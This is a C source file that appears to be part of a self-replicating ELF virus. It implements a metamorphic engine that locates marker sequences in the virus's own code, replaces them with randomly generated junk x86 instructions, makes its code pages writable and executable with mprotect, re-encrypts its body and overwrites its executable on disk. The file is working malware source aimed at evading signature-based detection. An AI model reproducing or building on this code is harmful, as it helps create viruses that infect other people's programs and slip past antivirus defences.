#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


#include "utils.h"
#include "death.h"
#include "data.h"
#include "syscall.h"

extern void __attribute__((naked)) _start(void);
extern void end(void);
extern int64_t g_key;

#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start

int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
uint16_t __attribute__((section(".text#"))) g_ri = 0;


/*
	   EAX ECX EDX EBX ESP EBP ESI EDI
   EAX C0  C8  D0  D8  E0  E8  F0  F8
   ECX C1  C9  D1  D9  E1  E9  F1  F9
   EDX C2  CA  D2  DA  E2  EA  F2  FA
   EBX C3  CB  D3  DB  E3  EB  F3  FB
   ESP C4  CC  D4  DC  E4  EC  F4  FC
   EBP C5  CD  D5  DD  E5  ED  F5  FD
   ESI C6  CE  D6  DE  E6  EE  F6  FE
   EDI C7  CF  D7  DF  E7  EF  F7  FF
*/

static int find_pattern(uint8_t *self, size_t offset) {
	return (self[offset] == PUSH_OP &&
			self[offset + 1] == PUSH_RBX &&

			self[offset + 2] == OP_64 &&
			self[offset + 3] == XCHG &&
			self[offset + 4] == RAX_RAX &&

			self[offset + 5] == OP_64 &&
			self[offset + 6] == XCHG &&
			self[offset + 7] == RAX_RAX &&

			self[offset + 8] == POP_RBX &&
			self[offset + 9] == POP_OP);
}

static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {

	int j = 0;
	for (size_t i = 0; i < size - JUNK_LEN; i++) {
		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
			junk_offsets[j] = i;
			j++;
			i += JUNK_LEN;
		}
	}
}

//  3 bytes opcodes
enum e_opcode3 {

	OPCODE_XCHG  = 0x87,
	OPCODE_MOV   = 0x8B,
	OPCODE_MOVSX = 0x63,

	OPCODE_ADD_RM_R = 0x01,
	OPCODE_ADD_R_RM = 0x03,

	OPCODE_SUB_RM_R = 0x29,
	OPCODE_SUB_R_RM = 0x2B,

	OPCODE_ADC  = 0x11,
	OPCODE_SBB  = 0x19,
	OPCODE_ADD  = 0x83,

	OPCODE_AND  = 0x21,
	OPCODE_OR   = 0x09,
	OPCODE_XOR  = 0x31,
	OPCODE_TEST = 0x85,
	OPCODE_CMP  = 0x39,
};

enum e_opcode4 {
    OPCODE_ADD_IMM     = 0x83, // 3 or 4 bytes (when adding immediate)
    OPCODE_MOV_RM_IMM  = 0xC7, // 4 bytes (moving immediate into memory)
    OPCODE_MUL_IMM     = 0xF7, // 4 bytes (multiplying with an immediate)
    OPCODE_IMUL_IMM    = 0x69, // 4 bytes (signed multiply with immediate)
    OPCODE_XOR_IMM     = 0x83, // 3 or 4 bytes (XOR with immediate)
    OPCODE_AND_IMM     = 0x83, // 3 or 4 bytes (AND with immediate)
    OPCODE_OR_IMM      = 0x83, // 3 or 4 bytes (OR with immediate)
    OPCODE_SUB_IMM     = 0x83, // 3 or 4 bytes (SUB with immediate)
    OPCODE_CMP_IMM     = 0x83, // 3 or 4 bytes (CMP with immediate)
    OPCODE_TEST_IMM    = 0xF6, // 4 bytes (TEST with immediate)
    OPCODE_ADC_IMM     = 0x83, // 3 or 4 bytes (ADC with immediate)
    OPCODE_SBB_IMM     = 0x83, // 3 or 4 bytes (SBB with immediate)
    OPCODE_MOVSX_IMM   = 0x63, // 4 bytes (MOVSX with immediate)
    OPCODE_MOVZX_IMM   = 0x0F, // 4 bytes (MOVZX with immediate)
    OPCODE_LEA_IMM     = 0x8D, // 4 bytes (LEA with an immediate)
    OPCODE_PUSH_IMM    = 0x6A, // 4 bytes (PUSH immediate)
    OPCODE_POP_IMM     = 0x8F, // 4 bytes (POP immediate)
    OPCODE_CALL_IMM    = 0xE8, // 4 bytes (CALL immediate address)
    OPCODE_JMP_IMM     = 0xE9, // 4 bytes (JMP immediate address)
    OPCODE_TEST_RM_IMM = 0xF6, // 4 bytes (TEST with r/m operand and immediate)
    OPCODE_CMP_RM_IMM = 0x81, // 4 bytes (CMP with r/m operand and immediate)
    OPCODE_CMP_R_RM   = 0x3B, // 4 bytes (CMP reg, r/m)
    OPCODE_MOV_R_RM_IMM = 0xC6, // 4 bytes (MOV r, r/m with immediate)
    OPCODE_MUL_RM_IMM = 0xF7, // 4 bytes (MUL r/m with immediate)
    OPCODE_DIV_RM_IMM = 0xF7, // 4 bytes (DIV r/m with immediate)
    OPCODE_NEG_RM_IMM = 0xF7, // 4 bytes (NEG r/m with immediate)
    OPCODE_CWD_IMM    = 0x99, // 4 bytes (CWD with immediate operand)
    OPCODE_CDQ_IMM    = 0x99, // 4 bytes (CDQ with immediate operand)
    OPCODE_LGDT_IMM   = 0x0F, // 4 bytes (LGDT with immediate operand)
    OPCODE_LIDT_IMM   = 0x0F, // 4 bytes (LIDT with immediate operand)
    OPCODE_SGDT_IMM   = 0x0F, // 4 bytes (SGDT with immediate operand)
    OPCODE_SIDT_IMM   = 0x0F, // 4 bytes (SIDT with immediate operand)
    OPCODE_FPU_FSTP   = 0xD9, // 4 bytes (FPU operations like FSTP)
    OPCODE_FPU_FLD    = 0xD8, // 4 bytes (FPU operations like FLD)
};



static uint8_t get_random_opcode3(uint8_t rand) {
	const uint8_t opcodes[] = {
		OPCODE_XCHG,
		OPCODE_MOV,
		OPCODE_MOVSX,
		OPCODE_ADD_RM_R,
		OPCODE_ADD_R_RM,
		OPCODE_SUB_RM_R,
		OPCODE_SUB_R_RM,
		OPCODE_ADC,
		OPCODE_SBB,
		OPCODE_AND,
		OPCODE_OR,
		OPCODE_XOR,
		OPCODE_TEST,
		OPCODE_CMP
	};

	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];

}

//static uint8_t get_random_opcode4(uint8_t rand) {
//	const uint8_t opcodes[] = {
//		OPCODE_ADD_IMM,
//		OPCODE_MOV_RM_IMM,
//		OPCODE_MUL_IMM,
//		OPCODE_IMUL_IMM,
//		OPCODE_XOR_IMM,
//		OPCODE_AND_IMM,
//		OPCODE_OR_IMM,
//		OPCODE_SUB_IMM,
//		OPCODE_CMP_IMM,
//		OPCODE_TEST_IMM,
//		OPCODE_ADC_IMM,
//		OPCODE_SBB_IMM,
//		OPCODE_MOVSX_IMM,
//		OPCODE_MOVZX_IMM,
//		OPCODE_LEA_IMM,
//		OPCODE_PUSH_IMM,
//		OPCODE_POP_IMM,
//		OPCODE_CALL_IMM,
//		OPCODE_JMP_IMM,
//		OPCODE_TEST_RM_IMM,
//		OPCODE_CMP_RM_IMM,
//		OPCODE_CMP_R_RM,
//		OPCODE_MOV_R_RM_IMM,
//		OPCODE_MUL_RM_IMM,
//		OPCODE_DIV_RM_IMM,
//		OPCODE_NEG_RM_IMM,
//		OPCODE_CWD_IMM,
//		OPCODE_CDQ_IMM,
//		OPCODE_LGDT_IMM,
//		OPCODE_LIDT_IMM,
//		OPCODE_SGDT_IMM,
//		OPCODE_SIDT_IMM,
//		OPCODE_FPU_FSTP,
//		OPCODE_FPU_FLD
//	};
//
//	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
//}

static inline uint8_t ft_nrand(void) {
	uint8_t rand = g_rand[g_ri];
	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
	return rand;
}

static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2) {


	int nop_size = JUNK_LEN - 4;
	int bytes_len = 0;
	int offset = 0;

	while (nop_size > 0) {
		bytes_len = (ft_nrand() % 3) + 2;
		if (nop_size < bytes_len) {
			bytes_len = nop_size;
		}

		_printf("bytes_len: %d\n", bytes_len);


		if (offset + bytes_len > JUNK_LEN) {
			bytes_len = JUNK_LEN - offset;
		}

		if (bytes_len == 0) {
			break;
		}
		else if (bytes_len == 1) {
			nop[offset] = 0x90;
		} 
		else if (bytes_len == 2) {

			if (ft_nrand() % 2) {
				nop[offset] = 0xEB;
				nop[offset + 1] = 0x00;
			} else {
				nop[offset] = 0x85;
				nop[offset + 1] = 0xC0 | (reg_1 << 3) | reg_1;
			}
		} else {

			nop[offset] = 0x48;
			nop[offset + 1] = get_random_opcode3(ft_nrand());

			if (bytes_len >= 3) {
				nop[offset + 2] = 0xC0 + reg_1 + (reg_2 << 3);
			}

			if (bytes_len == 4) {
				nop[offset + 3] = 0x90;
			}
		}

		offset += bytes_len;
		nop_size -= bytes_len;

	}
}

static void gen_junk(uint8_t *rdm_junk) {

	uint8_t reg_1 = 4;
	uint8_t reg_2 = 4;

	/* check is rsp */
	while (reg_1 == 4) reg_1 = ft_nrand() % 8;
	while (reg_2 == 4 || reg_2 == reg_1) reg_2 = ft_nrand() % 8;

	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
		reg_1 = 0;
		reg_2 = 1;
	}

	JUNK;

	uint8_t push_1 = PUSH_OP + reg_1;
	uint8_t push_2 = PUSH_OP + reg_2;

	uint8_t pop_1 = POP_OP + reg_1;
	uint8_t pop_2 = POP_OP + reg_2;

	uint8_t nop[NOPS_LEN];
	fill_nop(nop, reg_1, reg_2);

	rdm_junk[0] = push_1;
	rdm_junk[1] = push_2;

	ft_memcpy(rdm_junk + 2, nop, NOPS_LEN);
	_printf("%x %x %x %x %x %x\n", nop[0], nop[1], nop[2], nop[3], nop[4], nop[5]);

	rdm_junk[JUNK_LEN - 2] = pop_2;
	rdm_junk[JUNK_LEN - 1] = pop_1;

	JUNK;
}

static void replace_nop(uint8_t *self, int *junk_offsets) {

	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
		/* at this point junk_offsets is filled */
		if (junk_offsets[i] == 0) {
			break;
		}
		uint8_t rdm_junk[JUNK_LEN];
		gen_junk(rdm_junk);
		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

static int make_writeable(uint8_t *self, size_t size) {
	uintptr_t start = (uintptr_t)self;
	uintptr_t end = start + size;

	JUNK;

	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}
	return 0;
}

void prepare_mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	make_writeable((uint8_t *)start, VIRUS_SIZE);

	getrandom(g_rand, RAND_SIZE, 0);

	JUNK;

	if (g_junk_offsets[0] != 0)
		return;

	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
}

void mutate(void) {

	JUNK;

	uintptr_t start = (uintptr_t)&_start;

	replace_nop((uint8_t *)start, g_junk_offsets);
}

int death(int start_offset, file_t *file) {


	JUNK;

	uint8_t *self = (uint8_t *)file->view.data;
	char *self_name = file->abs_path;
	int fd = -1;

	uint8_t *entry = self + start_offset;

	if (start_offset != 0x1000) 
		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);


	JUNK;

	replace_nop(entry, g_junk_offsets);

	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
	uint8_t *junk = self + junk_pos + start_offset;
	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));

	if (start_offset != 0x1000)
		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);

	if (unlink(self_name) == -1) {
		munmap(self, file->view.size);
		return -1;
	}

	JUNK;

	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
	if (fd == -1)
		return -1;


	if (write(fd, self, file->view.size) == -1) {
		close(fd);
		munmap(self, file->view.size);
		return -1;
	}

	JUNK;

	if (munmap(self, file->view.size) == -1) {
		close(fd);
		return -1;
	}

	close(fd);

	return 0;
}
